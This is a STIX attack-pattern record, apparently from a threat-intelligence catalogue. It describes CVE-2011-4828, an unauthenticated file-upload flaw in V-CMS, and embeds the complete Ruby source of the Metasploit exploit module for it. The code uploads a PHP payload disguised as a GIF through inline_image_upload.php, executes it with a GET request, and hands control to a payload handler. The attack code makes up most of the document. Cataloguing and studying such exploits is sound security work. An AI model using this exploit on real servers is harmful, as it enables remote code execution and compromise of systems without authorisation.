{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76c2ab2e-4a8a-4c4b-85f2-1aea708f917b",
    "created": "2024-08-14T17:00:42.972137Z",
    "modified": "2024-08-14T17:00:42.972141Z",
    "name": "\"V-CMS PHP File Upload and Execute\"",
    "description": " This module exploits a vulnerability found on V-CMS's inline image upload feature. The problem is due to the inline_image_upload.php file not checking the file type before saving it on the web server. This allows any malicious user to upload a script (such as PHP) without authentication, and then execute it with a GET request.  The issue is fixed in 1.1 by checking the extension name.  By default, 1.1 only allows jpg, jpeg, png, gif, bmp, but it is still possible to upload a PHP file as one of those extension names, which may still be leveraged in an attack.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vcms_upload.rb",
            "external_id": "vcms_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4828"
        },
        {
            "source_name": "reference",
            "url": "http://xforce.iss.net/xforce/xfdb/71358"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"V-CMS PHP File Upload and Execute\",\n      'Description'    => %q{\n          This module exploits a vulnerability found on V-CMS's inline image upload feature.\n        The problem is due to the inline_image_upload.php file not checking the file type\n        before saving it on the web server. This allows any malicious user to upload a\n        script (such as PHP) without authentication, and then execute it with a GET request.\n\n          The issue is fixed in 1.1 by checking the extension name.  By default, 1.1 only\n        allows jpg, jpeg, png, gif, bmp, but it is still possible to upload a PHP file as\n        one of those extension names, which may still be leveraged in an attack.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'AutoSec Tools',  # Initial discovery\n          'sinn3r'          # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-4828'],\n          ['OSVDB', '77183'],\n          ['BID', '50706'],\n          ['URL', 'http://xforce.iss.net/xforce/xfdb/71358']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-11-27',  #When the ticket was created\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The URI path to vcms', '/vcms/'])\n        ])\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    res = send_request_raw({\n      'uri'   => uri,\n      'method' => 'GET'\n    })\n\n    if res and res.body =~ /V\\-CMS v1\\.[0-1]/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n\n    base = target_uri.path\n    base << '/' if base[-1,1] != '/'\n\n    @payload_name = \"#{rand_text_alpha(5)}.php\"\n    p = get_write_exec_payload(:unlink_self=>true)\n\n    post_data = \"------x\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"Filedata\\\"; filename=\\\"#{@payload_name}\\\"\\r\\n\"\n    post_data << \"Content-Type: image/gif\\r\\n\"\n    post_data << \"\\r\\n\"\n    post_data << p + \"\\r\\n\"\n    post_data << \"------x--\\r\\n\"\n\n    print_status(\"#{peer} Uploading payload: #{@payload_name}\")\n    res = send_request_cgi({\n      'uri'    => normalize_uri(base, 'includes/inline_image_upload.php'),\n      'method' => 'POST',\n      'ctype'  => 'multipart/form-data; boundary=----x',\n      'data'   => post_data\n    })\n\n    if res\n      print_status(\"#{peer} replies status: #{res.code.to_s}\")\n    else\n      print_error(\"#{peer} No response from server. Will not continue\")\n      return\n    end\n\n    print_status(\"#{peer} Executing payload: #{@payload_name}\")\n    res = send_request_raw({\n      'uri'    => \"#{base}temp/#{@payload_name}\",\n      'method' => 'GET'\n    })\n\n    if res and res.code == 404\n      print_error(\"#{peer} 404 - the upload probably failed\")\n      return\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-27,  #When the ticket was created",
    "x_mitre_platforms": [
        "php'"
    ]
}